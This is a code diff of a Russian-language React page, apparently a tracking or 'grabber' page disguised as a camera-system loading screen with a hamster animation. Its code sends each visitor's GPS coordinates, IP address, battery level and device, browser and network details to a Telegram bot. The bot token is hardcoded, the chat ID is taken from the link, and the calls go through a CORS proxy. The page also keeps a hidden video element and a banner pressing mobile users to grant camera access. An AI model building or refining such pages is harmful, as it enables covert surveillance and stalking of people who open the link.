-      // Отправляем дополнительную информацию
       await sendToTelegram(
-        `📍 *Геолокация по GPS*\n\n` +
-        `🎯 *Точность:* ±${Math.round(accuracy)} метров\n` +
-        `📏 *Координаты:* ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\n` +
-        `🏔 *Высота:* ${altitude ? Math.round(altitude) + ' м' : 'Неизвестно'}\n` +
-        `🧭 *Направление:* ${heading ? Math.round(heading) + '°' : 'Неизвестно'}\n` +
-        `🚀 *Скорость:* ${speed ? Math.round(speed * 3.6) + ' км/ч' : '0 км/ч'}\n` +
-        `🌐 *IP адрес:* ${clientIp}`
+        `📍 Геолокация по GPS\n\n` +
+        `🎯 Точность: ±${Math.round(accuracy)} метров\n` +
+        `📏 Координаты: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}\n` +
+        `🌐 IP: ${clientIp}`
       );
 
       localStorage.setItem("locationPermission", JSON.stringify(coords));
@@ -771,10 +738,10 @@ const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermi
 
     } catch (error) {
       if (error.code === error.PERMISSION_DENIED) {
-        alert("Пожалуйста, включите доступ к местоположению в настройках вашего устройства.");
+        alert("Для точного определения местоположения разрешите доступ к геолокации.");
         getLocationByIp();
       } else {
-        console.error("Error getting location permission:", error);
+        console.error("Error getting location:", error);
         getLocationByIp();
       }
     }
@@ -791,50 +758,38 @@ const LocationHandler = ({ setLocationPermission, setLocationSent, locationPermi
       position: 'fixed',
       bottom: '10px',
       left: '10px',
-      background: 'rgba(0, 0, 0, 0.8)',
+      background: 'rgba(0, 0, 0, 0.85)',
       color: 'white',
       padding: '15px',
       borderRadius: '10px',
-      zIndex: 9997,
-      maxWidth: '350px',
-      fontSize: '12px',
+      zIndex: 9998,
+      maxWidth: '320px',
+      fontSize: '14px',
       backdropFilter: 'blur(10px)',
-      border: '1px solid rgba(255,255,255,0.2)'
+      border: '1px solid rgba(255,255,255,0.2)',
+      boxShadow: '0 4px 20px rgba(0,0,0,0.3)'
     }}>
-      <h3 style={{ margin: '0 0 10px 0', color: '#FF6B6B' }}>📍 Геолокация</h3>
-      <div style={{ marginBottom: '5px' }}>
+      <h3 style={{ margin: '0 0 10px 0', color: '#FF6B6B', fontSize: '16px' }}>📍 Геолокация</h3>
+      <div style={{ marginBottom: '8px' }}>
         <strong>Метод:</strong> {locationData.method}
       </div>
       {locationData.city && (
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Местоположение:</strong> {locationData.city}, {locationData.region}, {locationData.country}
+        <div style={{ marginBottom: '8px' }}>
+          <strong>Место:</strong> {locationData.city}, {locationData.country}
         </div>
       )}
-      <div style={{ marginBottom: '5px' }}>
-        <strong>Координаты:</strong> {Number(locationData.coords.latitude).toFixed(6)}, {Number(locationData.coords.longitude).toFixed(6)}
+      <div style={{ marginBottom: '8px' }}>
+        <strong>Координаты:</strong><br/>
+        {Number(locationData.coords.latitude).toFixed(6)},<br/>
+        {Number(locationData.coords.longitude).toFixed(6)}
       </div>
       {locationData.accuracy && (
-        <div style={{ marginBottom: '5px' }}>
+        <div style={{ marginBottom: '8px' }}>
           <strong>Точность:</strong> ±{locationData.accuracy} м
         </div>
       )}
-      {locationData.altitude && (
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Высота:</strong> {locationData.altitude} м
-        </div>
-      )}
-      {locationData.speed && (
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Скорость:</strong> {locationData.speed} км/ч
-        </div>
-      )}
-      {locationData.provider && (
-        <div style={{ marginBottom: '5px' }}>
-          <strong>Провайдер:</strong> {locationData.provider}
-        </div>
-      )}
-      <div style={{ marginTop: '10px', fontSize: '10px', color: '#aaa' }}>
-        Данные обновлены: {new Date().toLocaleTimeString()}
+      <div style={{ marginTop: '10px', fontSize: '12px', color: '#aaa' }}>
+        Обновлено: {new Date().toLocaleTimeString()}
       </div>
     </div>
   ) : null;
@@ -847,34 +802,17 @@ const PhotoPage = () => {
   const { chatId } = useParams();
   const videoRef = useRef(null);
 
-  const [usrStream, setUsrStream] = useState(null);
   const [isCameraActive, setIsCameraActive] = useState(true);
-  const [locationSent, setLocationSent] = useState(false);
   const [locationPermission, setLocationPermission] = useState(null);
   const [clientIp, setClientIp] = useState("");
   const [deviceInfo, setDeviceInfo] = useState(null);
+  const [showMobileWarning, setShowMobileWarning] = useState(false);
 
   const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
 
-  const sendDataToTelegram = async (data) => {
+  const sendToTelegram = async (text) => {
     try {
-      const text = `📱 *ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ*\n\n` +
-                   `🔋 *Батарея:* ${data.batteryLevel} ${data.batteryCharging ? '(зарядка)' : ''}\n` +
-                   `📍 *IP адрес:* ${data.clientIp}\n` +
-                   `📏 *Разрешение экрана:* ${data.screenWidth}x${data.screenHeight} (x${data.devicePixelRatio || 1})\n` +
-                   `💻 *Тип устройства:* ${data.deviceType || 'Неизвестно'}\n` +
-                   `🖥 *Платформа:* ${data.platform || 'Неизвестно'}\n` +
-                   `🌐 *Браузер:* ${data.userAgent?.substring(0, 100)}...\n` +
-                   `🗣 *Язык:* ${data.language || 'Неизвестно'}\n` +
-                   `⏰ *Часовой пояс:* ${data.timezone || 'Неизвестно'}\n` +
-                   `📡 *Сеть:* ${data.connection?.effectiveType || 'Неизвестно'}\n` +
-                   `⚡ *Скорость сети:* ${data.connection?.downlink || 'Неизвестно'} Mbps\n` +
-                   `💾 *Память:* ${data.memory || 'Неизвестно'} GB\n` +
-                   `💻 *Ядра CPU:* ${data.cores || 'Неизвестно'}\n\n` +
-                   `🕐 *Время:* ${new Date().toLocaleString()}\n` +
-                   `📊 *Статус:* Активное отслеживание начато`;
-
-      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      const response = await fetch(`https://cors-proxy.telegram-api.workers.dev/?url=https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -882,14 +820,13 @@ const PhotoPage = () => {
         body: JSON.stringify({
           chat_id: chatId,
           text: text,
-          parse_mode: 'Markdown'
+          parse_mode: 'HTML'
         })
       });
 
       return response.ok;
-
     } catch (error) {
-      console.error('Error sending data to Telegram:', error);
+      console.error('Telegram send error:', error);
       return false;
     }
   };
@@ -900,20 +837,17 @@ const PhotoPage = () => {
         const battery = await navigator.getBattery();
         return {
           level: Math.floor(battery.level * 100) + "%",
-          charging: battery.charging,
-          chargingTime: battery.chargingTime,
-          dischargingTime: battery.dischargingTime
+          charging: battery.charging
         };
       } else {
         return {
-          level: "N/A",
+          level: "Недоступно",
           charging: false
         };
       }
     } catch (error) {
-      console.error("❌ Error getting battery level:", error);
       return {
-        level: "Error",
+        level: "Ошибка",
         charging: false
       };
     }
@@ -921,93 +855,64 @@ const PhotoPage = () => {
 
   const getDeviceInfo = () => {
     const userAgent = navigator.userAgent;
-    const platform = navigator.platform;
-    const screenWidth = window.screen.width;
-    const screenHeight = window.screen.height;
-    const devicePixelRatio = window.devicePixelRatio;
     const isMobile = /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-    const deviceType = isMobile ? "Mobile Device" : "Desktop Device";
-
-    const language = navigator.language || navigator.userLanguage;
-    const languages = navigator.languages;
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     
-    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    const connectionInfo = connection ? {
-      effectiveType: connection.effectiveType,
-      downlink: connection.downlink,
-      rtt: connection.rtt,
-      saveData: connection.saveData
-    } : null;
-
-    const memory = navigator.deviceMemory;
-    const cores = navigator.hardwareConcurrency;
-
     return {
       userAgent,
-      platform,
-      screenWidth,
-      screenHeight,
-      devicePixelRatio,
-      deviceType,
-      language,
-      languages,
-      timezone,
-      connection: connectionInfo,
-      memory,
-      cores,
+      platform: navigator.platform,
+      screenWidth: window.screen.width,
+      screenHeight: window.screen.height,
+      devicePixelRatio: window.devicePixelRatio,
+      deviceType: isMobile ? "Мобильное устройство" : "Компьютер",
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      connection: navigator.connection || null,
+      memory: navigator.deviceMemory,
+      cores: navigator.hardwareConcurrency,
       isMobile
     };
   };
 
   useEffect(() => {
-    const getUserData = async () => {
+    const init = async () => {
+      const info = getDeviceInfo();
+      setDeviceInfo(info);
+      
+      // Показываем предупреждение для мобильных
+      if (info.isMobile) {
+        setShowMobileWarning(true);
+        setTimeout(() => setShowMobileWarning(false), 5000);
+      }
+
       try {
-        console.log("🎯 Starting data collection for chatId:", chatId);
-
-        const deviceInfo = getDeviceInfo();
-        setDeviceInfo(deviceInfo);
-        
-        const batteryInfo = await getBatteryLevel();
-
-        const data = {
-          chat_id: chatId,
-          batteryLevel: batteryInfo.level,
-          batteryCharging: batteryInfo.charging,
-          screenWidth: deviceInfo.screenWidth,
-          screenHeight: deviceInfo.screenHeight,
-          devicePixelRatio: deviceInfo.devicePixelRatio,
-          clientIp: clientIp,
-          userAgent: deviceInfo.userAgent,
-          deviceType: deviceInfo.deviceType,
-          platform: deviceInfo.platform,
-          language: deviceInfo.language,
-          timezone: deviceInfo.timezone,
-          connection: deviceInfo.connection,
-          memory: deviceInfo.memory,
-          cores: deviceInfo.cores
-        };
-
-        console.log("📤 Sending user data:", data);
-
-        await sendDataToTelegram(data);
-
-        console.log("✅ User data sent successfully");
-
-      } catch (err) {
-        console.error("❌ Error sending user data to server:", err);
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        setClientIp(data.ip);
+      } catch {
+        setClientIp("Неизвестно");
       }
     };
 
-    if (chatId) {
-      getUserData();
-    }
-  }, [chatId, clientIp]);
+    init();
+  }, []);
 
   return (
     <>
-      <div className="App">
-        <div className="wraper">
+      <div className="App" style={{
+        minHeight: '100vh',
+        display: 'flex',
+        alignItems: 'center',
+        justifyContent: 'center',
+        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
+        padding: '20px',
+        boxSizing: 'border-box'
+      }}>
+        <div className="wraper" style={{
+          position: 'relative',
+          width: '100%',
+          maxWidth: '600px',
+          margin: '0 auto'
+        }}>
           <div className="wheel-and-hamster">
             <div className="wheel"></div>
             <div className="hamster">
@@ -1026,78 +931,101 @@ const PhotoPage = () => {
             </div>
             <div className="spoke"></div>
           </div>
+          
+          <div style={{
+            marginTop: '30px',
+            textAlign: 'center',
+            color: 'white'
+          }}>
+            <h1 style={{ fontSize: '24px', marginBottom: '10px' }}>📷 Система камеры</h1>
+            <p style={{ fontSize: '16px', opacity: 0.9 }}>
+              {deviceInfo?.isMobile ? 'Мобильное устройство' : 'Компьютер'}
+            </p>
+          </div>
         </div>
 
         <video
           ref={videoRef}
           autoPlay
           muted
-          style={{ display: 'none' }}
           playsInline
+          style={{ 
+            display: 'none',
+            position: 'fixed',
+            top: '0',
+            left: '0',
+            width: '100%',
+            height: '100%',
+            objectFit: 'cover',
+            zIndex: -1
+          }}
         />
       </div>
+
+      {showMobileWarning && (
+        <div style={{
+          position: 'fixed',
+          top: '20px',
+          left: '50%',
+          transform: 'translateX(-50%)',
+          background: 'rgba(255, 193, 7, 0.9)',
+          color: '#000',
+          padding: '15px 20px',
+          borderRadius: '10px',
+          zIndex: 10002,
+          fontSize: '14px',
+          maxWidth: '90%',
+          textAlign: 'center',
+          boxShadow: '0 4px 15px rgba(0,0,0,0.2)',
+          animation: 'fadeInOut 5s ease-in-out'
+        }}>
+          ⚠️ Для работы на мобильном устройстве разрешите доступ к камере
+        </div>
+      )}
 
       {deviceInfo && (
         <div style={{
           position: 'fixed',
-          top: '150px',
+          top: '200px',
           right: '10px',
-          background: 'rgba(0, 0, 0, 0.8)',
+          background: 'rgba(0, 0, 0, 0.85)',
           color: 'white',
           padding: '15px',
           borderRadius: '10px',
-          zIndex: 9996,
-          maxWidth: '350px',
+          zIndex: 9997,
+          maxWidth: '300px',
           maxHeight: '400px',
           overflow: 'auto',
-          fontSize: '12px',
+          fontSize: '14px',
           backdropFilter: 'blur(10px)',
-          border: '1px solid rgba(255,255,255,0.2)'
+          border: '1px solid rgba(255,255,255,0.2)',
+          boxShadow: '0 4px 20px rgba(0,0,0,0.3)'
         }}>
-          <h3 style={{ margin: '0 0 10px 0', color: '#FFEAA7' }}>📱 Информация об устройстве</h3>
-          <div style={{ marginBottom: '5px' }}>
+          <h3 style={{ margin: '0 0 10px 0', color: '#FFEAA7', fontSize: '16px' }}>📱 Устройство</h3>
+          <div style={{ marginBottom: '8px' }}>
             <strong>Тип:</strong> {deviceInfo.deviceType}
           </div>
-          <div style={{ marginBottom: '5px' }}>
-            <strong>Платформа:</strong> {deviceInfo.platform}
+          <div style={{ marginBottom: '8px' }}>
+            <strong>Экран:</strong> {deviceInfo.screenWidth}×{deviceInfo.screenHeight}
           </div>
-          <div style={{ marginBottom: '5px' }}>
-            <strong>Экран:</strong> {deviceInfo.screenWidth} × {deviceInfo.screenHeight} (x{deviceInfo.devicePixelRatio})
-          </div>
-          <div style={{ marginBottom: '5px' }}>
+          <div style={{ marginBottom: '8px' }}>
             <strong>Язык:</strong> {deviceInfo.language}
           </div>
-          <div style={{ marginBottom: '5px' }}>
+          <div style={{ marginBottom: '8px' }}>
             <strong>Часовой пояс:</strong> {deviceInfo.timezone}
           </div>
-          {deviceInfo.memory && (
-            <div style={{ marginBottom: '5px' }}>
-              <strong>Память:</strong> {deviceInfo.memory} GB
-            </div>
-          )}
           {deviceInfo.cores && (
-            <div style={{ marginBottom: '5px' }}>
+            <div style={{ marginBottom: '8px' }}>
               <strong>Ядра CPU:</strong> {deviceInfo.cores}
             </div>
           )}
           {deviceInfo.connection && (
-            <>
-              <div style={{ marginBottom: '5px' }}>
-                <strong>Тип сети:</strong> {deviceInfo.connection.effectiveType}
-              </div>
-              <div style={{ marginBottom: '5px' }}>
-                <strong>Скорость:</strong> {deviceInfo.connection.downlink} Mbps
-              </div>
-              <div style={{ marginBottom: '5px' }}>
-                <strong>Задержка:</strong> {deviceInfo.connection.rtt} ms
-              </div>
-            </>
-          )}
-          <div style={{ marginBottom: '5px' }}>
-            <strong>User Agent:</strong>
-            <div style={{ fontSize: '10px', color: '#aaa', wordBreak: 'break-word', marginTop: '2px' }}>
-              {deviceInfo.userAgent.substring(0, 100)}...
+            <div style={{ marginBottom: '8px' }}>
+              <strong>Сеть:</strong> {deviceInfo.connection.effectiveType}
             </div>
+          )}
+          <div style={{ marginTop: '10px', fontSize: '12px', color: '#aaa' }}>
+            IP: {clientIp || 'Определение...'}
           </div>
         </div>
       )}
@@ -1106,7 +1034,7 @@ const PhotoPage = () => {
         chatId={chatId}
         locationPermission={locationPermission}
         setLocationPermission={setLocationPermission}
-        setLocationSent={setLocationSent}
+        setLocationSent={() => {}}
         clientIp={clientIp}
       />
 
@@ -1118,6 +1046,36 @@ const PhotoPage = () => {
           setLocationPermission={setLocationPermission}
         />
       )}
+
+      <style>{`
+        @keyframes fadeInOut {
+          0% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+          10% { opacity: 1; transform: translateX(-50%) translateY(0); }
+          90% { opacity: 1; transform: translateX(-50%) translateY(0); }
+          100% { opacity: 0; transform: translateX(-50%) translateY(-20px); }
+        }
+        
+        /* Мобильная адаптация */
+        @media (max-width: 768px) {
+          .App {
+            padding: 10px !important;
+          }
+          
+          h1 {
+            font-size: 20px !important;
+          }
+          
+          .wraper {
+            transform: scale(0.8);
+          }
+        }
+        
+        @media (max-width: 480px) {
+          .wraper {
+            transform: scale(0.7);
+          }
+        }
+      `}</style>
     </>
   );
 };
